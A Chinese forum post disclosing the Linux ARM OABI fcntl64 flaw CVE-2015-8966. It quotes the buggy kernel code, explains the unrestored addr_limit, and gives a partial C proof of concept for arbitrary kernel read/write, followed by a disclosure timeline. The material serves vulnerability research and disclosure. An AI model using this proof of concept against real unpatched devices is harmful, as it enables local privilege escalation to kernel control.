

# [原创] CVE-2015-8966 / AndroidID-31435731

## 0x0 前言

这个漏洞大概是在去年 11 月中旬无意在内核源码中发现的，原理十分简单（看起来非常像一个后门……）。

## 0x1 分析

漏洞存在于 ARM 平台的 legacy syscall `fcntl64`：

```c
asmlinkage long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd,
                                 unsigned long arg) {
        struct oabi_flock64 user;
        struct flock64 kernel;
        mm_segment_t fs = USER_DS; /* initialized to kill a warning */
        unsigned long local_arg = arg;
        int ret;

        switch (cmd) {
        case F_OFD_GETLK:
        case F_OFD_SETLK:
        case F_OFD_SETLKW:
        case F_GETLK64:
        case F_SETLK64:
        case F_SETLKW64:
                if (copy_from_user(&user, (struct oabi_flock64 __user *)arg,
                                   sizeof(user)))
                        return -EFAULT;

                kernel.l_type = user.l_type;
                kernel.l_whence = user.l_whence;
                kernel.l_start = user.l_start;
                kernel.l_len = user.l_len;
                kernel.l_pid = user.l_pid;

                local_arg = (unsigned long)&kernel;
                fs = get_fs();
                set_fs(KERNEL_DS);          //[1]
        }

        ret = sys_fcntl64(fd, cmd, local_arg);

        switch (cmd) {
        case F_GETLK64:
                if (!ret) {
                        ...
                }

        case F_SETLK64:
        case F_SETLKW64:
                set_fs(fs);     //[2]
        }

        return ret;
}
```

这个 syscall 的设计是：

1. 准备参数，设置当前进程为 `addr_limit: KERNEL_DS`。
2. 调用真正实现的函数 `sys_fcntl64`。
3. 返回结果，恢复当前进程的 `addr_limit: USER_DS`。

在 `[1]` 部分，将当前进程 `addr_limit` 设置为 `KERNEL_DS`，该标识能够让进程获得内核的任意读写权限。

在 `[2]` 部分恢复时，只有某些 command 类型才恢复 `addr_limit`。

## 0x2 利用

之所以说看起来像后门，是因为一行 ioctl 代码就能获取任意内核读写权限。

获取任意内核读写权限的 POC：

```c
__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd,
                                             unsigned int cmd,
                                             unsigned long arg) {
        __asm__ __volatile__(
                "swi        0x9000DD\n"
                "mov        pc, lr\n"
                :
                :
                :
        );
}

#define F_OFD_GETLK  36
#define F_OFD_SETLK  37
#define F_OFD_SETLKW 38

int main(int argc, char const *argv[]) {
        int fd = open("/proc/cpuinfo", O_RDONLY);
        struct flock *map_base = 0;

        if (fd == -1) {
                perror("open");
                return -1;
        }

        map_base = (struct flock *)mmap(
                NULL,
                0x1000,
                PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS,
                -1,
                0
        );

        if (map_base == (void *)-1) {
                perror("mmap");
                goto _done;
        }

        printf("map_base %p\n", map_base);
        memset(map_base, 0, 0x1000);

        map_base->l_start = SEEK_SET;

        if (sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)) {
                perror("sys_oabi_fcntl64");
        }

        // Arbitrary kernel read/write test
        if (try_to_read_kernel()) {
                printf("pwnned !\n");
        }

        munmap(map_base, 0x1000);

_done:
        close(fd);
        return 0;
}
```

## 0x3 结尾

这个漏洞影响内核版本：`3.15-4.3`，安卓平台影响 `3.18`。

现阶段支持 OABI 的设备越来越少，虽然这个漏洞看起来很不错，但实际能用的地方并不多，这也是我提交的原因之一。

Btw，这个 `CVE-2015-8966` 我并不知道怎么来的，Google 给的 issue 是：`AndroidID-31435731`。

## 0x4 Timeline

- 2016.09.10 提交给 Kernel Security。
- 2016.09.15 Kernel 确认影响内核版本，将在下一轮的稳定内核版本中修复。
- 2016.09.10 在 goldfish 3.18 验证后提交给 Google。
- 2016.09.12 谷歌反馈，设置为 Critical。
- 2016.10.04 谷歌确认不影响当前任何谷歌设备。
- 2016.12.05 Android Security Bulletin－December 2016。

[CVE-2015-8966.pdf](https://bbs.kanxue.com/attach-download-109307.htm)

---

Twitter/Weibo: ThomasKing2014

site: `thomasking2014.com`

---

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [CVE-2015-8966.pdf](javascript:void(0);)
  - （125.91kb，89 次下载）

